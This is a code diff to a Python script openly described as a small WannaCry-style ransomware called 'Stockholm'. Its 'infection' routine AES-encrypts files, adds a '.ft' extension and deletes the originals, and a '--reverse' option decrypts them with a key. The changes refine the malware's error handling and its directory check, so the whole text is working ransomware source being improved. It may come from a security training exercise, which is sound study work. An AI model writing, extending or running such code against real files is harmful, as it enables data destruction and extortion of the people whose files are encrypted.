@@ -37,8 +37,12 @@ def infection(file):
             with open(file + ".ft", "wb") as f_out:
                 pyAesCrypt.encryptStream(f_in, f_out, os.getenv("KEY"), BUFFERSIZE)
                 os.remove(file)
-    except:
-        print(f"Error encrypting {file}")
+    except FileNotFoundError:
+        print(f"File not found: {file}")
+    except PermissionError:
+        print(f"Permission denied: {file}")
+    except Exception as e:
+        print(f"Error encrypting {file}: {str(e)}")
 
 def reverse(file, key):
     try:
@@ -50,14 +54,18 @@ def reverse(file, key):
         print(f"Error decrypting {file}")
 
 def main():
+    if not os.path.isdir(DIRECTORY):
+        print(f"Directory {DIRECTORY} does not exist.")
+        exit(1)
     parser = argparse.ArgumentParser(description="Stockholm is a shitty version of wannacry")
     parser.add_argument("-v", "--version",action='version', version='Stockholm 0.0.1', help="Show program's version number and exit")
-    parser.add_argument("-r", "--reverse",type=str, metavar='KEY', help="Reverse the infection using the provided key")
+    parser.add_argument("-r", "--reverse", type=str, metavar='KEY', 
+                        help="Reverse the infection using the provided key")
     parser.add_argument("-s", "--silent", action="store_true", help="Silent mode")
 
     args = parser.parse_args()
     if args.reverse:
-        print(f"Reversing the infection using key: {args.reverse}")
+        print("Reversing the infection process...")
         for file in os.listdir(DIRECTORY):
             if file.endswith(".ft"):
                 file_path = os.path.join(DIRECTORY, file)
